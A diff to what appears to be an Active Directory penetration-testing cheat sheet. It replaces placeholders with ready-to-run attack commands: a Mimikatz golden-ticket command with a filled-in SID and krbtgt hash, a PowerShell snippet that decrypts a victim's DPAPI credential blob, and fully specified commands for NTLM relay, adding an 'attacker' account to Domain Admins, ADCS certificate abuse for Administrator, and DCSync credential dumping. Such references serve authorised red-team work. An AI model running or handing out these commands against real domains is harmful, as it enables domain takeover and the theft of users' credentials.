@@ -147,8 +147,8 @@ lsadump::sam
 lsadump::dcsync /domain:corp.com /user:krbtgt
 lsadump::dcsync /domain:corp.com /all /csv
 
-# Golden ticket:
-kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
+# Golden ticket (replace SID with your domain SID from `whoami /user` or `Get-ADDomain`):
+kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-1004336348-1177238915-682003330 /krbtgt:8846f7eaee8fb117ad06bdd830b7586c /ptt
 
 # PTH (Pass-the-Hash) for lateral movement:
 sekurlsa::pth /user:Admin /domain:corp.com /ntlm:HASH /run:cmd.exe
@@ -215,8 +215,11 @@ crackmapexec ldap 10.10.10.100 -u user -p pass --module laps
 
 # Same data accessible via:
 cmdkey /list           # list stored credentials
-# PowerShell alternative:
-[System.Security.Cryptography.ProtectedData]::Unprotect(...)
+# PowerShell alternative (unprotect a DPAPI blob using current user key):
+Add-Type -AssemblyName System.Security
+$encrypted = [System.IO.File]::ReadAllBytes("C:\Users\victim\AppData\Local\Microsoft\Credentials\blob.dat")
+$plain = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+[System.Text.Encoding]::UTF8.GetString($plain)
 # Or via Mimikatz:
 vault::cred
 ```
@@ -525,15 +528,15 @@ python3 ADExplorerSnapshot.py snapshot1.dat snapshot2.dat --compare
 # nxc smb hosts.txt -u users -p pass  # password spray
 
 # Phase 4 — Lateral Movement:
-# .\SharpLAPS.exe                     # LAPS password dump
-# nxc smb TARGET --sam / --lsa        # local credential dump
-# python3 ntlmrelayx.py -tf targets   # NTLM relay
-# bloodyAD add groupMember ...        # ACL abuse
+# .\SharpLAPS.exe                                                          # LAPS password dump
+# nxc smb TARGET --sam / --lsa                                             # local credential dump
+# python3 ntlmrelayx.py -tf targets -smb2support                           # NTLM relay
+# bloodyAD -u user -p pass -d corp.local --host DC01 add groupMember 'Domain Admins' attacker  # ACL abuse
 
 # Phase 5 — DA / DCSync:
-# lsadump::dcsync /user:krbtgt        # DCSync via Mimikatz
-# python3 secretsdump.py corp/admin:pass@DC01  # remote DCSync
-# certipy req ... -upn Administrator  # ADCS cert for DA
+# lsadump::dcsync /user:krbtgt                                             # DCSync via Mimikatz
+# python3 secretsdump.py corp/admin:pass@DC01                              # remote DCSync
+# certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn Administrator@corp.local  # ADCS cert for DA
 ```
 
 ## Resources
